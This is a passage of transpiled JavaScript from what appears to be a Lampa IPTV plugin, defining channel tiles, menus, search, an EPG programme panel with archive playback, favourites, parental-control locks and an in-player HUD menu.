                if (a.type == 'epg_guide') {
                  if (groupChannels.length) {
                    TVGuide.open({
                      channels: groupChannels,
                      filterGroup: groupName,
                      focusChannel: element,
                      onPlay: function onPlay(pos) {
                        TVGuide.close();
                        _this2.listener.send('play', {
                          position: _this2.icons.indexOf(groupChannels[pos]),
                          total: _this2.icons.length
                        });
                      },
                      onPlayArchive: function onPlayArchive(data) {
                        TVGuide.close();
                        _this2.listener.send('play-archive', data);
                      }
                    });
                  } else {
                    Lampa.Noty.show(Lampa.Lang.translate('iptv_noprogram'));
                  }
                } else if (a.type == 'favorite') {
                  TVFavorites.toggle(element)["finally"](function () {
                    _this2.icon(item, element);
                    _this2.listener.send('update-favorites');
                  });
                } else if (a.type == 'locked') {
                  if (Lampa.Manifest.app_digital >= 204) {
                    if (Locked.find(Locked.format('channel', element))) {
                      Lampa.ParentalControl.query(function () {
                        _this2.toggle();
                        Locked.remove(Locked.format('channel', element))["finally"](function () {
                          _this2.icon(item, element);
                        });
                      }, _this2.toggle.bind(_this2));
                    } else {
                      Locked.add(Locked.format('channel', element))["finally"](function () {
                        _this2.icon(item, element);
                      });
                    }
                  } else {
                    Lampa.Noty.show(Lampa.Lang.translate('iptv_need_update_app'));
                  }
                }
              },
              onBack: _this2.toggle.bind(_this2)
            });
          }).on('hover:enter', function () {
            _this2.listener.send('play', {
              position: position,
              total: _this2.icons.length
            });
          });
          _this2.html.append(item);
          if (Lampa.Controller.own(_this2)) Lampa.Controller.collectionAppend(item);
        });
        setTimeout(function () {
          Lampa.Layer.visible(_this2.html);
        }, 300);
      }
    }, {
      key: "toggle",
      value: function toggle() {
        var _this3 = this;
        Lampa.Controller.add('content', {
          link: this,
          toggle: function toggle() {
            if (_this3.html.find('.selector')) {
              Lampa.Controller.collectionSet(_this3.html);
              Lampa.Controller.collectionFocus(_this3.last, _this3.html);
            } else _this3.listener.send('toggle', 'menu');
          },
          left: function left() {
            return _this3.listener.send('toggle', 'menu');
          },
          right: function right() {
            return _this3.listener.send('toggle', 'details');
          },
          up: function up() {
            if (Navigator.canmove('up')) Navigator.move('up');else Lampa.Controller.toggle('head');
          },
          down: function down() {
            if (window.iptv_mobile) _this3.listener.send('toggle', 'details');else if (Navigator.canmove('down')) Navigator.move('down');
          },
          back: function back() {
            return _this3.listener.send('back');
          }
        });
        Lampa.Controller.toggle('content');
      }
    }, {
      key: "render",
      value: function render() {
        return this.scroll.render(true);
      }
    }, {
      key: "destroy",
      value: function destroy() {
        this.scroll.destroy();
        this.html.remove();
      }
    }]);
  }();

  var Details = /*#__PURE__*/function () {
    function Details(listener) {
      var _this = this;
      _classCallCheck(this, Details);
      this.listener = listener;
      this.html = Lampa.Template.js('modss_iptv_details');
      this.title = this.html.find('.iptv-details__title');
      this.play = this.html.find('.iptv-details__play');
      this.progm = this.html.find('.iptv-details__program');
      this.progm_image = false;
      this.empty_html = Lampa.Template.js('modss_iptv_details_empty');
      this.listener.follow('details-load', this.draw.bind(this));
      if (window.iptv_mobile) this.html.removeClass('layer--wheight');
      this.timer = setInterval(function () {
        if (_this.timeline) _this.timeline();
      }, 1000 * 5);
    }
    return _createClass(Details, [{
      key: "draw",
      value: function draw(channel) {
        var _this2 = this;
        this.title.text(Utils.clearChannelName(channel.name));
        this.group(channel, Utils.clearMenuName(channel.group || Lampa.Lang.translate('player_unknown')));
        this.wait_for = channel.name;
        if (channel.id) {
          this.progm.text(Lampa.Lang.translate('loading') + '...');
          TVApi.program({
            name: channel.name,
            channel_id: channel.id,
            time: EPG.time(channel),
            tvg: channel.tvg
          }).then(function (program) {
            if (_this2.wait_for == channel.name) {
              if (program.length) _this2.program(channel, program);else _this2.empty();
            }
          })["catch"](function (e) {
            _this2.empty();
          });
        } else {
          this.empty();
        }
      }
    }, {
      key: "group",
      value: function group(channel, title) {
        this.play.empty();
        var group = document.createElement('span');
        group.text(title);
        if (Utils.hasArchive(channel)) {
          var archive = document.createElement('span');
          archive.addClass('lb').text('A');
          this.play.append(archive);
        }
        var hd = Utils.isHD(channel.name);
        if (hd) {
          var hd_lb = document.createElement('span');
          hd_lb.addClass('lb').text(hd.toUpperCase());
          this.play.append(hd_lb);
        }
        this.play.append(group);
      }
    }, {
      key: "empty",
      value: function empty() {
        this.timeline = false;
        this.progm.empty().append(this.empty_html);
      }
    }, {
      key: "buildProgramList",
      value: function buildProgramList(channel, program, params) {
        var _this3 = this;
        var stime = EPG.time(channel);
        var start = EPG.position(channel, program);
        var archive = Utils.hasArchive(channel);
        if (!params && program[start]) {
          this.group(channel, Lampa.Utils.shortText(Utils.clear(program[start].title), 50));
        }
        return new Lampa.Endless(function (position) {
          if (position >= program.length) return _this3.endless.to(position - 1);
          var wrap = document.createElement('div');
          var list = EPG.list(channel, program, 10, position);
          wrap.addClass('iptv-details__list');
          list.forEach(function (elem, index) {
            var item = document.createElement('div');
            if (elem.type == 'date') item.addClass('iptv-program-date').text(elem.date);else {
              item.addClass('iptv-program selector');
              var head, icon_wrap, icon_img, head_body;
              var time = document.createElement('div');
              time.addClass('iptv-program__time').text(Lampa.Utils.parseTime(elem.program.start).time);
              var body = document.createElement('div');
              body.addClass('iptv-program__body');
              var title = document.createElement('div');
              title.addClass('iptv-program__title').text(Utils.clear(elem.program.title));
              if (elem.program.icon && index == 1) {
                head = document.createElement('div');
                head_body = document.createElement('div');
                icon_wrap = document.createElement('div');
                icon_img = document.createElement('img');
                head.addClass('iptv-program__head');
                head_body.addClass('iptv-program__head-body');
                icon_wrap.addClass('iptv-program__icon-wrap');
                icon_img.addClass('iptv-program__icon-img');
                icon_wrap.append(icon_img);
                head.append(icon_wrap);
                head.append(head_body);
                head_body.append(title);
                body.append(head);
                if (_this3.progm_image && _this3.progm_image.waiting) _this3.progm_image.src = '';
                icon_img.onload = function () {
                  icon_img.waiting = false;
                  icon_wrap.addClass('loaded');
                };
                icon_img.error = function () {
                  icon_wrap.addClass('loaded-error');
                  icon_img.src = './img/img_broken.svg';
                };
                icon_img.waiting = true;
                icon_img.src = elem.program.icon;
                _this3.progm_image = icon_img;
              } else {
                body.append(title);
              }
              if (elem.watch) {
                var timeline = document.createElement('div');
                timeline.addClass('iptv-program__timeline');
                var div = document.createElement('div');
                div.style.width = EPG.timeline(channel, elem.program) + '%';
                timeline.append(div);
                if (!params) {
                  _this3.timeline = function () {
                    var percent = EPG.timeline(channel, elem.program);
                    div.style.width = percent + '%';
                    if (percent == 100) {
                      var next = EPG.position(channel, program);
                      if (start !== next) _this3.program(channel, program);
                    }
                  };
                }
                if (archive) {
                  item.on('hover:enter', function () {
                    var data = {
                      program: elem.program,
                      position: position,
                      channel: channel,
                      playlist: program.slice(Math.max(0, position - 40), start)
                    };
                    if (params) params.onPlay(data);else _this3.listener.send('play-archive', data);
                  });
                }
                item.addClass('played');
                if (elem.program.icon && head_body) {
                  head_body.append(timeline);
                } else {
                  body.append(timeline);
                }
              }
              if (index == 1 && elem.program.desc) {
                var text = Utils.clear(elem.program.desc);
                if (text.length > 300) text = text.slice(0, 300) + '...';
                var descr = document.createElement('div');
                descr.addClass('iptv-program__descr').text(text);
                body.append(descr);
              }
              if (archive) {
                var minus = stime - archive * 1000 * 60 * 60 * 24;
                if (elem.program.start > minus && elem.program.stop < stime) {
                  item.addClass('archive');
                  item.on('hover:enter', function () {
                    var data = {
                      program: elem.program,
                      position: position,
                      channel: channel,
                      timeshift: stime - elem.program.start,
                      playlist: program.slice(Math.max(0, position - 40), start)
                    };
                    if (params) params.onPlay(data);else _this3.listener.send('play-archive', data);
                  });
                }
              }
              item.append(time);
              item.append(body);
            }
            wrap.append(item);
          });
          return wrap;
        }, {
          position: start
        });
      }

      /**
       * Программа в плеере
       */
    }, {
      key: "playlist",
      value: function playlist(channel, program) {
        var params = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : {};
        return this.buildProgramList(channel, program, params);
      }

      /**
       * Программа в главном интерфейсе
       */
    }, {
      key: "program",
      value: function program(channel, _program) {
        if (this.endless) this.endless.destroy();
        this.timeline = false;
        this.endless = this.buildProgramList(channel, _program);
        this.progm.empty().append(this.endless.render());
      }
    }, {
      key: "toggle",
      value: function toggle() {
        var _this4 = this;
        Lampa.Controller.add('content', {
          link: this,
          toggle: function toggle() {
            if (_this4.html.find('.selector')) {
              Lampa.Controller.collectionSet(_this4.html);
              Lampa.Controller.collectionFocus(false, _this4.html);
            } else _this4.listener.send('toggle', 'icons');
          },
          left: function left() {
            _this4.listener.send('toggle', 'icons');
          },
          up: function up() {
            if (_this4.endless) {
              _this4.endless.move(-1);
              Lampa.Controller.collectionSet(_this4.html);
              Lampa.Controller.collectionFocus(false, _this4.html);
            }
          },
          down: function down() {
            if (_this4.endless) {
              _this4.endless.move(1);
              Lampa.Controller.collectionSet(_this4.html);
              Lampa.Controller.collectionFocus(false, _this4.html);
            }
          },
          back: function back() {
            _this4.listener.send('back');
          }
        });
        Lampa.Controller.toggle('content');
      }
    }, {
      key: "render",
      value: function render() {
        return this.html;
      }
    }, {
      key: "destroy",
      value: function destroy() {
        this.html.remove();
        clearInterval(this.timer);
        this.wait_for = false;
      }
    }]);
  }();

  var last_query = '';
  var Search = /*#__PURE__*/function () {
    function Search() {
      _classCallCheck(this, Search);
    }
    return _createClass(Search, null, [{
      key: "find",
      value: function find(channels, call) {
        var controller = Lampa.Controller.enabled().name;
        Lampa.Input.edit({
          value: last_query,
          free: true,
          nosave: true
        }, function (new_value) {
          last_query = new_value;
          Lampa.Controller.toggle(controller);
          call({
            channels: channels.filter(function (c) {
              return c.name.toLowerCase().indexOf(new_value.toLowerCase()) >= 0;
            }),
            query: new_value
          });
        });
      }
    }]);
  }();

  var Menu = /*#__PURE__*/function () {
    function Menu(listener) {
      _classCallCheck(this, Menu);
      this.listener = listener;
      this.lastIconsLoad = null;
      this.html = Lampa.Template.js('modss_iptv_menu');
      this.menu = this.html.find('.iptv-menu__list');
      this.scroll = new Lampa.Scroll({
        mask: !window.iptv_mobile,
        over: true,
        horizontal: window.iptv_mobile
      });
      if (!window.iptv_mobile) this.scroll.minus();
      this.scroll.append(this.html);
    }
    return _createClass(Menu, [{
      key: "favorites",
      value: function favorites(channels) {
        var favorites = TVFavorites.list();
        if (Lampa.Storage.get('iptv_favotite_save', 'url') == 'name') {
          favorites = favorites.filter(function (f) {
            return channels.find(function (c) {
              return c.name == f.name;
            });
          });
          favorites.forEach(function (f) {
            f.url = channels.find(function (c) {
              return c.name == f.name;
            }).url;
          });
        }
        return favorites;
      }
    }, {
      key: "build",
      value: function build(data) {
        var _this = this;
        this.menu.empty();
        this.data = data;
        this.html.find('.iptv-menu__title').text(data.name || Lampa.Lang.translate('player_playlist'));
        var search_item = {
          name: Lampa.Lang.translate('search'),
          count: 0,
          search: true
        };
        this.html.find('.iptv-menu__search').on('hover:enter', function () {
          Search.find(data.playlist.channels, search_item.update);
        });
        Lampa.Arrays.insert(data.playlist.menu, 0, search_item);
        var favorites = this.favorites(data.playlist.channels);
        var category = Pilot.notebook('category');
        Lampa.Arrays.insert(data.playlist.menu, 0, {
          name: Lampa.Lang.translate('settings_input_links'),
          count: favorites.length,
          favorites: true
        });
        if (!window.iptv_mobile) {
          var _data$playlist$channe;
          var viewMode = Lampa.Storage.field('iptv_modss_view_mode') || 'tiles';
          Lampa.Arrays.insert(data.playlist.menu, 0, {
            name: viewMode === 'tiles' ? Lampa.Lang.translate('iptv_modss_view_list') : Lampa.Lang.translate('iptv_modss_view_tiles'),
            count: ((_data$playlist$channe = data.playlist.channels) === null || _data$playlist$channe === void 0 ? void 0 : _data$playlist$channe.length) || 0,
            viewSwitch: true
          });
        }
        var first;
        var first_item;
        var pilot;
        if (window.iptv_mobile) {
          var mobile_seacrh_button = Lampa.Template.js('iptv_menu_mobile_button_search');
          mobile_seacrh_button.on('hover:enter', function () {
            Search.find(data.playlist.channels, search_item.update);
          });
          this.menu.append(mobile_seacrh_button);
        }
        data.playlist.menu.forEach(function (menu) {
          if (menu.count == 0 && !(menu.favorites || menu.search || menu.viewSwitch)) return;
          var li = document.createElement('div');
          var co = document.createElement('span');
          var nm = document.createElement('div');
          var ic = document.createElement('div');
          li.addClass('iptv-menu__list-item selector');
          ic.addClass('iptv-menu__list-item-icon');
          nm.text(Utils.clearMenuName(menu.name || Lampa.Lang.translate('iptv_all_channels')));
          co.text(menu.count);
          li.append(ic);
          li.append(nm);
          if (!menu.viewSwitch) li.append(co);
          var icon_name = 'group';
          if (menu.favorites) icon_name = 'fav';
          if (menu.search) icon_name = 'searched';
          if (menu.viewSwitch) icon_name = 'tiles';
          if (!menu.name && !menu.viewSwitch) icon_name = 'all';
          if (icon_name === 'tiles') {
            ic.html('');
          } else {
            ic.append(Lampa.Template.js('modss_iptv_icon_' + icon_name));
          }
          if (menu.viewSwitch) {
            li.addClass('mds-view-switch--menu-item');
            var listSvg = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>';
            var tilesSvg = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>';
            var updateViewSwitch = function updateViewSwitch() {
              var mode = Lampa.Storage.field('iptv_modss_view_mode') || 'tiles';
              menu.name = mode === 'tiles' ? Lampa.Lang.translate('iptv_modss_view_list') : Lampa.Lang.translate('iptv_modss_view_tiles');
              nm.text(menu.name);
              ic.html(mode === 'tiles' ? listSvg : tilesSvg);
            };
            updateViewSwitch();
            _this.listener.follow('update-view-mode', updateViewSwitch);
          } else if (menu.favorites) {
            li.addClass('favorites--menu-item');
            _this.listener.follow('update-favorites', function () {
              favorites = TVFavorites.list();
              menu.count = favorites.length;
              co.text(menu.count);
            });
          } else if (menu.search) {
            li.addClass('search--menu-item');
            menu.update = function (result) {
              menu.find = result.channels;
              menu.count = result.channels.length;
              co.text(result.channels.length);
              if (menu.count) Lampa.Utils.trigger(li, 'hover:enter');else {
                Lampa.Noty.show(Lampa.Lang.translate('iptv_search_no_result') + ' (' + result.query + ')');
                if (first_item) Lampa.Utils.trigger(first_item, 'hover:enter');
              }
            };
          } else {
            if (!first_item) {
              first_item = li;
            }
            if (!menu.favorites && !menu.search && !menu.viewSwitch) {
              var updateIcon = function updateIcon() {
                ic.empty();
                ic.append(Lampa.Template.js('modss_iptv_icon_' + (Locked.find(Locked.format('group', menu.name)) ? 'lock' : 'group')));
              };
              updateIcon();
              li.on('hover:long', function () {
                var grpName = menu.name || '';
                var items = [{
                  title: Lampa.Lang.translate('iptv_param_guide') + ' — ' + (grpName ? Utils.clearMenuName(menu.name) : Lampa.Lang.translate('iptv_all_channels')),
                  type: 'epg_guide'
                }, {
                  title: Lampa.Lang.translate(Locked.find(Locked.format('group', grpName)) ? 'iptv_channel_unlock' : 'iptv_channel_lock'),
                  type: 'locked'
                }];
                Lampa.Select.show({
                  title: Lampa.Lang.translate('title_action'),
                  items: items,
                  onSelect: function onSelect(a) {
                    _this.toggle();
                    if (a.type == 'epg_guide') {
                      var channels = grpName ? data.playlist.channels.filter(function (c) {
                        return c.group == grpName;
                      }) : data.playlist.channels;
                      if (channels.length) {
                        var payload = {
                          menu: menu,
                          icons: channels
                        };
                        _this.lastIconsLoad = payload;
                        _this.listener.send('icons-load', payload);
                        TVGuide.open({
                          channels: channels,
                          filterGroup: grpName,
                          focusChannel: channels[0],
                          onPlay: function onPlay(pos) {
                            TVGuide.close();
                            _this.listener.send('play', {
                              position: pos,
                              total: channels.length
                            });
                          },
                          onPlayArchive: function onPlayArchive(data) {
                            TVGuide.close();
                            _this.listener.send('play-archive', data);
                          }
                        });
                      } else {
                        Lampa.Noty.show(Lampa.Lang.translate('iptv_noprogram'));
                      }
                    } else if (a.type == 'locked') {
                      if (Lampa.Manifest.app_digital >= 204) {
                        if (Locked.find(Locked.format('group', grpName))) {
                          Lampa.ParentalControl.query(function () {
                            _this.toggle();
                            Locked.remove(Locked.format('group', grpName))["finally"](updateIcon);
                          }, _this.toggle.bind(_this));
                        } else {
                          Locked.add(Locked.format('group', grpName))["finally"](updateIcon);
                        }
                      } else {
                        Lampa.Noty.show(Lampa.Lang.translate('iptv_need_update_app'));
                      }
                    }
                  },
                  onBack: _this.toggle.bind(_this)
                });
              });
            }
          }
          li.on('hover:enter', function () {
            if (menu.viewSwitch) {
              var mode = Lampa.Storage.field('iptv_modss_view_mode') || 'tiles';
              var newMode = mode === 'tiles' ? 'list' : 'tiles';
              Lampa.Storage.set('iptv_modss_view_mode', newMode);
              _this.listener.send('update-view-mode');
              _this.listener.send('view-mode-change', newMode);
              if (newMode === 'tiles' && _this.lastIconsLoad) _this.listener.send('icons-load', _this.lastIconsLoad);
              return;
            }
            if (menu.count == 0) return;
            var load = function load() {
              Pilot.notebook('category', menu.name || 'all');
              var payload = {
                menu: menu,
                icons: menu.name ? data.playlist.channels.filter(function (a) {
                  return a.group == menu.name;
                }) : data.playlist.channels
              };
              _this.lastIconsLoad = payload;
              _this.listener.send('icons-load', payload);
            };
            var toggle = function toggle() {
              var active = _this.menu.find('.active');
              if (active) active.removeClass('active');
              li.addClass('active');
              var target = window.iptv_mobile ? 'icons' : (Lampa.Storage.field('iptv_modss_view_mode') || 'tiles') === 'tiles' ? 'tiles' : 'icons';
              _this.listener.send('toggle', target);
            };
            if (menu.favorites) {
              Pilot.notebook('category', '');
              var payload = {
                menu: menu,
                icons: favorites
              };
              _this.lastIconsLoad = payload;
              _this.listener.send('icons-load', payload);
            } else if (menu.search) {
              Pilot.notebook('category', '');
              var _payload = {
                menu: menu,
                icons: menu.find
              };
              _this.lastIconsLoad = _payload;
              _this.listener.send('icons-load', _payload);
            } else {
              if (Lampa.Manifest.app_digital >= 204 && Locked.find(Locked.format('group', menu.name))) {
                return Lampa.ParentalControl.query(function () {
                  load();
                  toggle();
                }, _this.toggle.bind(_this));
              } else load();
            }
            toggle();
          });
          li.on('hover:focus', function () {
            _this.scroll.update(li, true);
            _this.last = li;
          });
          if (!first && menu.count !== 0 && !menu.viewSwitch) first = li;
          if (menu.name == category && category || !menu.name && category == 'all' && !menu.viewSwitch) pilot = li;
          _this.menu.append(li);
        });
        if (pilot) Lampa.Utils.trigger(pilot, 'hover:enter');else if (first) Lampa.Utils.trigger(first, 'hover:enter');
      }
    }, {
      key: "toggle",
      value: function toggle() {
        var _this2 = this;
        Lampa.Controller.add('content', {
          toggle: function toggle() {
            Lampa.Controller.collectionSet(_this2.html);
            Lampa.Controller.collectionFocus(_this2.last, _this2.html);
          },
          left: function left() {
            Lampa.Controller.toggle('menu');
          },
          right: function right() {
            _this2.listener.send('toggle', 'icons');
          },
          up: function up() {
            if (Navigator.canmove('up')) Navigator.move('up');else Lampa.Controller.toggle('head');
          },
          down: function down() {
            if (Navigator.canmove('down')) Navigator.move('down');
          },
          back: function back() {
            _this2.listener.send('back');
          }
        });
        Lampa.Controller.toggle('content');
      }
    }, {
      key: "render",
      value: function render() {
        return this.scroll.render(true);
      }
    }, {
      key: "destroy",
      value: function destroy() {
        this.scroll.destroy();
        this.html.remove();
      }
    }]);
  }();

  var Tiles = /*#__PURE__*/function () {
    function Tiles(listener) {
      var _this = this;
      _classCallCheck(this, Tiles);
      this.listener = listener;
      this.scroll = new Lampa.Scroll({
        mask: !window.iptv_mobile,
        over: true,
        end_ratio: 2
      });
      this.html = document.createElement('div');
      this.html.addClass('mds-iptv-tiles');
      this.scroll.append(this.html);
      if (!window.iptv_mobile) this.scroll.minus();
      this.position = 0;
      this.progCache = {};
      this.listener.follow('icons-load', function (data) {
        _this.icons = data.icons;
        _this.icons_clone = Lampa.Arrays.clone(_this.icons);
        _this.html.empty();
        _this.scroll.reset();
        _this.position = 0;
        _this.last = false;
        _this.progCache = {};
        _this.renderTiles();
      });
      this.listener.follow('view-mode-change', function (mode) {
        if (mode === 'tiles' && !window.iptv_mobile) Lampa.Layer.visible(_this.html);
      });
    }
    return _createClass(Tiles, [{
      key: "isTilesMode",
      value: function isTilesMode() {
        return !window.iptv_mobile && (Lampa.Storage.field('iptv_modss_view_mode') || 'tiles') === 'tiles';
      }
    }, {
      key: "loadProgram",
      value: function loadProgram(channel, callback) {
        var _this2 = this;
        var k = channel.id || 'none';
        if (this.progCache[k]) {
          callback(this.progCache[k]);
          return;
        }
        if (!channel.id) {
          callback([]);
          return;
        }
        TVApi.program({
          name: channel.name,
          channel_id: channel.id,
          tvg: channel.tvg,
          time: EPG.time(channel)
        }).then(function (prog) {
          _this2.progCache[k] = prog || [];
          callback(_this2.progCache[k]);
        })["catch"](function () {
          callback([]);
        });
      }
    }, {
      key: "icon",
      value: function icon(item, element) {
        var icons = item.find('.mds-iptv-tile__icons');
        icons.empty();
        if (TVFavorites.find(element)) icons.append(Lampa.Template.js('modss_iptv_icon_fav'));
        if (Locked.find(Locked.format('channel', element))) icons.append(Lampa.Template.js('modss_iptv_icon_lock'));
      }
    }, {
      key: "renderTiles",
      value: function renderTiles() {
        var _this3 = this;
        if (!this.icons || !this.icons.length) return;
        this.icons.forEach(function (element, position) {
          var item = document.createElement('div');
          var body = document.createElement('div');
          var img = document.createElement('img');
          var info = document.createElement('div');
          var prog = document.createElement('div');
          var bar = document.createElement('div');
          var icn = document.createElement('div');
          item.addClass('mds-iptv-tile selector layer--visible layer--render');
          body.addClass('mds-iptv-tile__body');
          img.addClass('mds-iptv-tile__ico');
          info.addClass('mds-iptv-tile__info');
          prog.addClass('mds-iptv-tile__prog');
          bar.addClass('mds-iptv-tile__bar');
          icn.addClass('mds-iptv-tile__icons');
          body.append(img);
          info.append(prog);
          info.append(bar);
          item.append(body);
          item.append(info);
          item.append(icn);
          _this3.icon(item, element);
          _this3.listener.follow('update-channel-icon', function (channel) {
            if (channel.name == element.name) _this3.icon(item, element);
          });
          item.on('visible', function () {
            if (!_this3.isTilesMode()) return;
            img.onerror = function () {
              img.removeAttribute('src');
              var text = document.createElement('div');
              text.addClass('mds-iptv-tile__name');
              text.textContent = Utils.clear(element.name);
              body.append(text);
            };
            img.onload = function () {
              item.addClass('loaded');
              if ((img.naturalWidth || img.width) < 90) item.addClass('small--icon');
            };
            if (element.logo) img.src = element.logo;else img.onerror();
            var barFill = document.createElement('div');
            bar.append(barFill);
            _this3.loadProgram(element, function (program) {
              if (!program || !program.length) {
                prog.textContent = '';
                barFill.style.width = '0%';
                return;
              }
              var pos = EPG.position(element, program);
              var now = program[pos];
              prog.textContent = Lampa.Utils.shortText(Utils.clear(now.title), 40);
              barFill.style.width = EPG.timeline(element, now) + '%';
            });
          });
          item.on('hover:focus', function () {
            _this3.active(item);
            _this3.scroll.update(item);
            _this3.last = item;
          }).on('hover:hover hover:touch', function () {
            Navigator.focused(item);
            _this3.active(item);
            _this3.last = item;
          }).on('hover:long', function () {
            var groupName = element.group || '';
            var groupChannels = groupName ? _this3.icons.filter(function (c) {
              return c.group === groupName;
            }) : _this3.icons;
            var items = [{
              title: Lampa.Lang.translate('iptv_param_guide') + (groupName ? ' — ' + Utils.clearMenuName(groupName) : ''),
              type: 'epg_guide'
            }, {
              title: Lampa.Lang.translate(TVFavorites.find(element) ? 'iptv_remove_fav' : 'iptv_add_fav'),
              type: 'favorite'
            }, {
              title: Lampa.Lang.translate(Locked.find(Locked.format('channel', element)) ? 'iptv_channel_unlock' : 'iptv_channel_lock'),
              type: 'locked'
            }];
            Lampa.Select.show({
              title: Lampa.Lang.translate('title_action'),
              items: items,
              onSelect: function onSelect(a) {
                _this3.toggle();
                if (a.type == 'epg_guide') {
                  if (groupChannels.length) {
                    TVGuide.open({
                      channels: groupChannels,
                      filterGroup: groupName,
                      focusChannel: element,
                      onPlay: function onPlay(pos) {
                        TVGuide.close();
                        _this3.listener.send('play', {
                          position: _this3.icons.indexOf(groupChannels[pos]),
                          total: _this3.icons.length
                        });
                      },
                      onPlayArchive: function onPlayArchive(data) {
                        TVGuide.close();
                        _this3.listener.send('play-archive', data);
                      }
                    });
                  } else {
                    Lampa.Noty.show(Lampa.Lang.translate('iptv_noprogram'));
                  }
                } else if (a.type == 'favorite') {
                  TVFavorites.toggle(element)["finally"](function () {
                    _this3.icon(item, element);
                    _this3.listener.send('update-favorites');
                  });
                } else if (a.type == 'locked') {
                  if (Lampa.Manifest.app_digital >= 204) {
                    if (Locked.find(Locked.format('channel', element))) {
                      Lampa.ParentalControl.query(function () {
                        _this3.toggle();
                        Locked.remove(Locked.format('channel', element))["finally"](function () {
                          return _this3.icon(item, element);
                        });
                      }, _this3.toggle.bind(_this3));
                    } else {
                      Locked.add(Locked.format('channel', element))["finally"](function () {
                        return _this3.icon(item, element);
                      });
                    }
                  } else Lampa.Noty.show(Lampa.Lang.translate('iptv_need_update_app'));
                }
              },
              onBack: _this3.toggle.bind(_this3)
            });
          }).on('hover:enter', function () {
            _this3.listener.send('play', {
              position: position,
              total: _this3.icons.length
            });
          });
          _this3.html.append(item);
          if (Lampa.Controller.own(_this3)) Lampa.Controller.collectionAppend(item);
        });
        if (this.isTilesMode()) setTimeout(function () {
          return Lampa.Layer.visible(_this3.html);
        }, 100);
      }
    }, {
      key: "active",
      value: function active(item) {
        var active = this.html.find('.active');
        if (active) active.removeClass('active');
        item.addClass('active');
      }
    }, {
      key: "toggle",
      value: function toggle() {
        var _this4 = this;
        Lampa.Controller.add('content', {
          link: this,
          toggle: function toggle() {
            if (_this4.html.find('.selector')) {
              Lampa.Controller.collectionSet(_this4.html);
              Lampa.Controller.collectionFocus(_this4.last, _this4.html);
            } else _this4.listener.send('toggle', 'menu');
          },
          left: function left() {
            if (Navigator.canmove('left')) Navigator.move('left');else _this4.listener.send('toggle', 'menu');
          },
          right: function right() {
            if (Navigator.canmove('right')) Navigator.move('right');
          },
          up: function up() {
            if (Navigator.canmove('up')) Navigator.move('up');else Lampa.Controller.toggle('head');
          },
          down: function down() {
            if (Navigator.canmove('down')) Navigator.move('down');
          },
          back: function back() {
            return _this4.listener.send('back');
          }
        });
        Lampa.Controller.toggle('content');
      }
    }, {
      key: "render",
      value: function render() {
        return this.scroll.render(true);
      }
    }, {
      key: "destroy",
      value: function destroy() {
        this.scroll.destroy();
        this.html.remove();
        this.progCache = {};
      }
    }]);
  }();

  var HUDMenu = /*#__PURE__*/function () {
    function HUDMenu(listener, channel) {
      _classCallCheck(this, HUDMenu);
      this.listener = listener;
      this.channel = channel;
      this.original = channel.original;
      this.html = document.createElement('div');
    }
    return _createClass(HUDMenu, [{
      key: "create",
      value: function create() {
        var _this = this;
        var info = $("\n            <div class=\"iptv-hud-menu-info\">\n                <div class=\"iptv-hud-menu-info__group\">".concat(this.channel.group, "</div>\n                <div class=\"iptv-hud-menu-info__name\">").concat(this.channel.name, "</div>\n            </div>\n        "))[0];
        var favorite = this.button(Lampa.Template.get('modss_iptv_icon_favorite', {}, true), Lampa.Lang.translate('settings_input_links'), function () {
          TVFavorites.toggle(_this.original)["finally"](function () {
            favorite.toggleClass('active', Boolean(TVFavorites.find(_this.original)));
            _this.listener.send('action-favorite', _this.original);
          });
        });
        var locked = this.button(Lampa.Template.get('modss_iptv_icon_lock', {}, true), Lampa.Lang.translate(Locked.find(Locked.format('channel', this.original)) ? 'iptv_channel_unlock' : 'iptv_channel_lock'), function () {
          var name = Lampa.Controller.enabled().name;
          if (Lampa.Manifest.app_digital >= 204) {
            if (Locked.find(Locked.format('channel', _this.original))) {
              Lampa.ParentalControl.query(function () {
                Lampa.Controller.toggle(name);
                Locked.remove(Locked.format('channel', _this.original))["finally"](function () {
                  locked.toggleClass('active', Boolean(Locked.find(Locked.format('channel', _this.original))));
                  _this.listener.send('action-locked', _this.original);
                });
              }, function () {
                Lampa.Controller.toggle(name);
              });
            } else {
              Locked.add(Locked.format('channel', _this.original))["finally"](function () {
                locked.toggleClass('active', Boolean(Locked.find(Locked.format('channel', _this.original))));
                _this.listener.send('action-locked', _this.original);
              });
            }
          } else {
            Lampa.Noty.show(Lampa.Lang.translate('iptv_need_update_app'));
          }
        });
        favorite.toggleClass('active', Boolean(TVFavorites.find(this.original)));
        locked.toggleClass('active', Boolean(Locked.find(Locked.format('channel', this.original))));
        this.html.append(info);
        this.html.append(favorite);
        this.html.append(locked);
      }
    }, {
      key: "button",
      value: function button(icon, text, call) {
        var button = $("\n            <div class=\"iptv-hud-menu-button selector\">\n                <div class=\"iptv-hud-menu-button__icon\">".concat(icon, "</div>\n                <div class=\"iptv-hud-menu-button__text\">").concat(text, "</div>\n            </div>\n        "));
        button.on('hover:enter', call);
        return button[0];
      }
    }, {
      key: "toggle",
      value: function toggle() {
        var _this2 = this;
        Lampa.Controller.add('player_iptv_hud_menu', {
          toggle: function toggle() {
            Lampa.Controller.collectionSet(_this2.render());
            Lampa.Controller.collectionFocus(false, _this2.render());
          },
          up: function up() {
            Navigator.move('up');
          },
          down: function down() {
            Navigator.move('down');
          },
          right: function right() {
            _this2.listener.send('toggle_program');
          },
          gone: function gone() {
            var focus = _this2.html.find('.focus');
            if (focus) focus.removeClass('focus');
          },
          back: function back() {
            _this2.listener.send('close');
          }
        });
        Lampa.Controller.toggle('player_iptv_hud_menu');
      }
    }, {
      key: "render",
      value: function render() {
        return this.html;
      }
    }, {
      key: "destroy",
      value: function destroy() {}
    }]);
  }();

  var HUDProgram = /*#__PURE__*/function () {
    function HUDProgram(listener, channel, program) {
      _classCallCheck(this, HUDProgram);
      this.listener = listener;
